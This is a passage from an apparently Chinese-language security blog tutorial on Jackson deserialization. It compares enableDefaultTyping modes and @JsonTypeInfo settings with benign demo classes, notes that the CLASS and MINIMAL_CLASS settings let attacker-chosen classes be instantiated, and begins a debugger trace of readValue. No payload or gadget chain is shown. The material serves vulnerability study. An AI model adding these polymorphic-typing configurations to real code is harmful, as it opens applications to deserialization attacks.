<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OBJECT_AND_NON_CONCRETEdemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.age = <span class="number">20</span>;</span><br><span class="line">        person.name = <span class="string">&quot;CurlySean&quot;</span>;</span><br><span class="line">        person.hacker = <span class="keyword">new</span> <span class="title class_">Hacker</span>();</span><br><span class="line">        person.sex = <span class="keyword">new</span> <span class="title class_">MySex</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> objectMapper.writeValueAsString(person);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> objectMapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样我们来对比一下在设置和没有设置情况下序列化字符串的区别</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">20</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;CurlySean&quot;</span>,<span class="string">&quot;hacker&quot;</span>:[<span class="string">&quot;com.Jackson.Hacker&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;],<span class="string">&quot;sex&quot;</span>:[<span class="string">&quot;com.Jackson.MySex&quot;</span>,&#123;<span class="string">&quot;sex&quot;</span>:<span class="number">0</span>&#125;]&#125;</span><br><span class="line"><span class="comment">//未设置OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">20</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;CurlySean&quot;</span>,<span class="string">&quot;hacker&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;,<span class="string">&quot;sex&quot;</span>:&#123;<span class="string">&quot;sex&quot;</span>:<span class="number">0</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755795904729-04aeb902-f6cc-4f08-a1f2-4d23d6599b08.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755795904729-04aeb902-f6cc-4f08-a1f2-4d23d6599b08.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>但是未设置<code>OBJECT_AND_NON_CONCRETE</code>时，反序列化的操作就不是那么顺利了，由于<strong>接口类</strong>的原因，并不能成功的反序列化，<strong>抽象类</strong>同理</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755796129555-f7e9f8dc-c2a9-4a03-a51c-2292c22a1c08.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755796129555-f7e9f8dc-c2a9-4a03-a51c-2292c22a1c08.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="aeFG1">NON_CONCRETE_AND_ARRAYS</h5>

<p>NON_CONCRETE_AND_ARRAYS：在除前面Object、接口类和抽象类以外，多支持了Array数组类型</p>
<p>同样编写测试代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NON_CONCRETE_AND_ARRAYSdemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.age = <span class="number">20</span>;</span><br><span class="line">        person.name = <span class="string">&quot;CurlySean&quot;</span>;</span><br><span class="line">        Hacker[] hackers = <span class="keyword">new</span> <span class="title class_">Hacker</span>[<span class="number">2</span>];</span><br><span class="line">        hackers[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Hacker</span>();</span><br><span class="line">        hackers[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Hacker</span>();</span><br><span class="line">        person.hacker = hackers;</span><br><span class="line">        person.sex = <span class="keyword">new</span> <span class="title class_">MySex</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> objectMapper.writeValueAsString(person);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> objectMapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置<code>NON_CONCRETE_AND_ARRAYS</code>的情况下，数组类会在全类名前添加<code>[L</code>，代表这是一个Array类，value的内容格式为<code>[&quot;key1&quot;:&quot;value1&quot;,&quot;key2&quot;:&quot;value2&quot;......]</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">20</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;CurlySean&quot;</span><span class="punctuation">,</span><span class="attr">&quot;hacker&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;[Lcom.Jackson.Hacker;&quot;</span><span class="punctuation">,</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.Jackson.MySex&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755796440844-103c9539-9235-42f9-a676-b9d3e930fd62.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755796440844-103c9539-9235-42f9-a676-b9d3e930fd62.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="c4wzX">NON_FINAL</h5>

<p>NON_FINAL：在整个类中，除final外的属性都会被序列化和反序列化</p>
<p>在Person类中添加final的secret属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object hacker;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line">    <span class="keyword">final</span> String secret=<span class="string">&quot;secret&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s&quot;</span>, age, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改测试Demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NON_FINALdemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.age = <span class="number">20</span>;</span><br><span class="line">        person.name = <span class="string">&quot;CurlySean&quot;</span>;</span><br><span class="line">        Hacker[] hackers = <span class="keyword">new</span> <span class="title class_">Hacker</span>[<span class="number">2</span>];</span><br><span class="line">        hackers[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Hacker</span>();</span><br><span class="line">        hackers[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Hacker</span>();</span><br><span class="line">        person.hacker = hackers;</span><br><span class="line">        person.sex = <span class="keyword">new</span> <span class="title class_">MySex</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> objectMapper.writeValueAsString(person);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> objectMapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行后输出的json字符串如下，可以看到是十分详细了，但我们的final的secret属性并没有被序列化进来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[<span class="string">&quot;com.Jackson.Person&quot;</span>,&#123;<span class="string">&quot;age&quot;</span>:<span class="number">20</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;CurlySean&quot;</span>,<span class="string">&quot;hacker&quot;</span>:[<span class="string">&quot;[Lcom.Jackson.Hacker;&quot;</span>,[[<span class="string">&quot;com.Jackson.Hacker&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;],[<span class="string">&quot;com.Jackson.Hacker&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;]]],<span class="string">&quot;sex&quot;</span>:[<span class="string">&quot;com.Jackson.MySex&quot;</span>,&#123;<span class="string">&quot;sex&quot;</span>:<span class="number">0</span>&#125;]&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755796978205-56817a01-d244-47de-852f-47a4f8fdb264.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755796978205-56817a01-d244-47de-852f-47a4f8fdb264.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="NJD6P">@JsonTypeInfo</h4>

<p><code>@JsonTypeInfo</code>注解是Jackson多态类绑定的一种方式，取值支持以下五种</p>
<ul>
<li>@JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.NONE) </li>
<li>@JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.CLASS) </li>
<li>@JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.MINIMAL_CLASS)</li>
<li>@JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.NAME) </li>
<li>@JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.CUSTOM)</li>
</ul>
<h5 id="Jf81s">NONE</h5>
测试代码是一样的，主要是在Person类中配置

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NONETEST</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.age = <span class="number">20</span>;</span><br><span class="line">        student.name = <span class="string">&quot;CurlySean&quot;</span>;</span><br><span class="line">        student.friend = <span class="keyword">new</span> <span class="title class_">Hacker</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> objectMapper.writeValueAsString(student);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s2</span> <span class="operator">=</span> objectMapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(s2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>新建一个Student类，给Object类型属性添加<code>@JsonTypeInfo</code>注解，并指定属性为<code>JsonTypeInfo.Id.NONE</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span></span><br><span class="line">    <span class="keyword">public</span> Object friend;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Student.age=%d, Student.name=%s&quot;</span>, age, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，设置和没有设置<code>JsonTypeInfo.Id.NONE</code>是一样的</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">20</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;CurlySean&quot;</span><span class="punctuation">,</span><span class="attr">&quot;friend&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755826837830-24687c48-3532-4fdf-b71e-2bd9f1009fec.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755826837830-24687c48-3532-4fdf-b71e-2bd9f1009fec.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="PWzpj">CLASS</h5>

<p>修改Student类<code>@JsonTypeInfo</code>注解的值为<code>JsonTypeInfo.Id.CLASS</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span></span><br></pre></td></tr></table></figure>

<p>运行后输出以下内容，其中为Object类的属性，多了<code>&quot;@class&quot;:&quot;com.Jackson.Hacker&quot;</code>，即含有具体的全类名信息。并且我们可以看到，在反序列化出来的Object类型的属性，也可以对应上我们指定的类型</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">20</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;CurlySean&quot;</span><span class="punctuation">,</span><span class="attr">&quot;friend&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@class&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.Jackson.Hacker&quot;</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">Student.age=<span class="number">20</span><span class="punctuation">,</span> Student.name=CurlySean <span class="punctuation">,</span> com.Jackson.Hacker@<span class="number">55</span>f3ddb1</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755827220163-27a95d41-b58f-4d5c-aa56-be58b52e3bf5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755827220163-27a95d41-b58f-4d5c-aa56-be58b52e3bf5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>那么在反序列化的过程中，如果使用了<code>JsonTypeInfo.Id.CLASS</code>进行修饰，那么就可以通过<code>@class</code>的方式指定类，进行相关的调用</p>
<h5 id="OAAuH">MINIMAL_CLASS</h5>

<p>同样修改Student类中对于Object类型属性所设置的<code>@JsonTypeInfo</code>注解值为<code>JsonTypeInfo.Id.MINIMAL_CLASS</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br></pre></td></tr></table></figure>

<p>运行后查看输出，唯一的区别就是<code>@c</code>替换了<code>@class</code>，剩下的和<code>CLASS</code>注解值是一样的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">20</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;CurlySean&quot;</span>,<span class="string">&quot;friend&quot;</span>:&#123;<span class="string">&quot;@c&quot;</span>:<span class="string">&quot;com.Jackson.Hacker&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;&#125;</span><br><span class="line">Student.age=<span class="number">20</span>, Student.name=CurlySean , com.Jackson.Hacker@18be83e4</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755827526270-dd1bd374-aa59-4c1f-9846-763c62c82823.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755827526270-dd1bd374-aa59-4c1f-9846-763c62c82823.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="rICVH">NAME</h5>

<p>修改注解值为<code>JsonTypeInfo.Id.NAME</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)</span></span><br></pre></td></tr></table></figure>

<p>可以看到，在对于Object类属性序列化时，使用<code>&quot;@type&quot;:&quot;className&quot;</code>的方式指定类，但是没有具体的包名，这也就导致了后面在反序列化时会报错，因此该设置值不能被反序列化利用</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755827626201-ffc4704e-6f2d-4fd2-a366-96ff5e1be8c9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755827626201-ffc4704e-6f2d-4fd2-a366-96ff5e1be8c9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="GmgMx">JsonTypeInfo.Id.CUSTOM</h5>

<p>其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常</p>
<h5 id="SfjK3">小结</h5>

<p>根据前面的测试，当<code>@JsonTypeInfo</code>的注解值为以下两者之一，来修饰Object类的属性时，就可以用来触发Jackson反序列化漏洞</p>
<ul>
<li>JsonTypeInfo.Id.CLASS</li>
<li>JsconTypeInfo.Id.MINIMAL_CLASS</li>
</ul>
<h3 id="q83Kq">类属性方法的调用</h3>

<p>对于fastjson、snakeyaml等依赖，也是提供字符串与Java对象之间的转化。之前学习过，这两种依赖在反序列化的过程中，会调用对应类的构造方法和部分setter与getter方法进行对象属性的赋值，那么Jackson也是同理</p>
<p>这里看一下两种实现方式是否有区别</p>
<h4 id="smGGv">DefaultTyping</h4>
这里我们新增一个Teacher类

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Teacher</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Teacher.age=%d, Teacher.name=%s, %s&quot;</span>, age, name, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为MySex类设置setter、getter与构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySex</span> <span class="keyword">implements</span> <span class="title class_">Sex</span>&#123;</span><br><span class="line">    <span class="type">int</span> sex;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MySex</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Mysex.Constructor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Mysex.setter&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Mysex.getter&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写测试代码，配置无参数的<code>enableDefaultTyping()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:28,\&quot;name\&quot;:\&quot;CurlySean\&quot;,\&quot;sex\&quot;:[\&quot;com.Jackson.MySex\&quot;,&#123;\&quot;sex\&quot;:1&#125;]&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Teacher</span> <span class="variable">teacher</span> <span class="operator">=</span> objectMapper.readValue(json, Teacher.class);</span><br><span class="line">        System.out.println(teacher);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到输出，可以知道在反序列化的过程中，调用了MySex类的setter方法与无参构造方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755830245619-ef55a096-3725-4e48-ade1-cc7dff958e70.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755830245619-ef55a096-3725-4e48-ade1-cc7dff958e70.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="EFXyd">@JsonTypeInfo 注解</h4>

<p>修改Teacher类，在Sex类的前面添加注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Teacher</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span></span><br><span class="line"><span class="comment">//    @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Teacher.age=%d, Teacher.name=%s, %s&quot;</span>, age, name, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在刚刚的测试代码中，将<code>objectMapper.enableDefaultTyping();</code>部分注释掉</p>
<p>运行后看到，和使用 DefaultTyping 是一样的</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755830677861-12c1b139-a0f0-4115-938e-496fa548f291.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755830677861-12c1b139-a0f0-4115-938e-496fa548f291.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="faUNP">反序列化调试分析</h3>
<h4 id="urGEM">调试分析</h4>

<p>在将json字符串反序列化为Java对象的过程中，主要操作只有两步：</p>
<ul>
<li>通过构造函数生成实例</li>
<li>通过setter方法设置实例属性值</li>
</ul>
<p>我们给Teacher类添加一个构造函数，然后在Teacher类、MySex类的构造函数、setter方法和getter方法打断点</p>
<p>在readValue处打一个断点，我们进行调试分析</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832178227-e47a8287-dfdc-4042-931c-5b8a8ffdda03.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832178227-e47a8287-dfdc-4042-931c-5b8a8ffdda03.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进到<code>_readMapAndClose</code>方法中，首先进行了JsonToken的初始化，然后调用了<code>deserialize</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832393208-20a92137-1af2-4a96-9e13-f788eff89347.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832393208-20a92137-1af2-4a96-9e13-f788eff89347.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>继续跟进<code>deserialize</code>方法，如果是在第一次初始化时，我们就会走到<code>vanillaDeserialize</code>方法处</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832516559-c7d0d954-7fe4-47f4-a91b-0a25d88f2752.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832516559-c7d0d954-7fe4-47f4-a91b-0a25d88f2752.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>走入<code>vanillaDeserialize</code>，在该方法中首先调用了<code>createUsingDefault</code>方法，<code>this._defaultCreator.call</code>方法调用了对应类的无参构造方法并生成实例</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832732945-bc5afe5c-ad63-47c6-9ba4-56c658fbaba3.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832732945-bc5afe5c-ad63-47c6-9ba4-56c658fbaba3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
